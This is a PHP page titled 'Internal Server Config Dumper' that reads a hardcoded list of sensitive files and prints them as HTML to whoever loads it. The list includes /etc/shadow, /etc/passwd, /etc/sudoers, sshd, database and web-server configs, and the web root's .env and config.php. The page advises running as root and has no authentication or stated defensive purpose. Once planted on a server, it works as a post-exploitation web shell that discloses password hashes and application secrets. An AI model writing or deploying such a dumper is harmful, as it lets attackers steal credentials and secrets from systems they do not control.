<?php
function tableRow($key, $value) {
    return "<tr><th style='text-align:left;padding:5px;border:1px solid #333'>$key</th><td style='padding:5px;border:1px solid #333'>$value</td></tr>";
}

function print_file_html(string $path): string {
    if (!file_exists($path)) {
        return "[ ] $path → not found or inaccessible\n";
    }

    $stat = @stat($path);
    if ($stat === false) {
        return "[ ] $path → stat failed (" . error_get_last()['message'] . ")\n";
    }

    if (is_dir($path)) {
        return "[ ] $path → is a directory, skipping\n";
    }

    $content = @file_get_contents($path);
    if ($content === false) {
        $err = error_get_last();
        return "[ ] $path → cannot read (" . ($err['message'] ?? 'unknown error') . ")\n";
    }

    $size   = $stat['size'];
    $uid    = $stat['uid'];
    $gid    = $stat['gid'];
    $mode   = $stat['mode'] & 07777; // just permissions
    $octal  = sprintf('%04o', $mode);

    $output = "<div style='margin-bottom:15px'>";
    $output .= "<strong>[+] $path (size: $size bytes, uid:$uid gid:$gid mode:0$octal)</strong><br>";
    $output .= "<pre style='background:#000;color:#9fef00;padding:10px;border:1px solid #333'>" . htmlspecialchars($content) . "</pre>";
    $output .= "</div>";
    return $output;
}

// HTML Header
echo "<!DOCTYPE html><html lang='en'><head><meta charset='UTF-8'><title>Config Dumper</title>
<style>
body { font-family: monospace; background: #0f0f0f; color: #9fef00; padding: 20px; }
h1 { color: #00ff99; }
pre { white-space: pre-wrap; word-wrap: break-word; }
strong { color: #00ff99; }
</style></head><body>";
echo "<h1>Internal Server Config Dumper</h1>";
echo "<p>Run as root for best results</p>";
echo "<p>Current UID: " . posix_geteuid() . "  EUID: " . posix_getuid() . "<br>";
echo "Current GID: " . posix_getegid() . "  EGID: " . posix_getgid() . "</p>";

$configs = [
    '/etc/passwd',
    '/etc/shadow',
    '/etc/group',
    '/etc/sudoers',
    '/etc/sudoers.d/README',
    '/etc/apache2/apache2.conf',
    '/etc/apache2/sites-enabled/000-default.conf',
    '/etc/nginx/nginx.conf',
    '/etc/nginx/sites-enabled/default',
    '/etc/mysql/my.cnf',
    '/etc/mysql/mariadb.conf.d/50-server.cnf',
    '/etc/postgresql/14/main/postgresql.conf',
    '/etc/postgresql/15/main/postgresql.conf',
    '/etc/ssh/sshd_config',
    '/etc/redis/redis.conf',
    '/etc/docker/daemon.json',
    '/var/www/html/config.php',
    '/var/www/html/.env',
    '/etc/hosts',
    '/proc/cpuinfo',
    '/proc/meminfo',
];

foreach ($configs as $path) {
    if (str_contains($path, '*')) {
        $files = glob($path);
        if ($files) {
            foreach ($files as $f) {
                echo print_file_html($f);
            }
        } else {
            echo "<p>[ ] $path → no matching files found</p>";
        }
        continue;
    }
    echo print_file_html($path);
}

echo "<p>Done.</p></body></html>";
?>
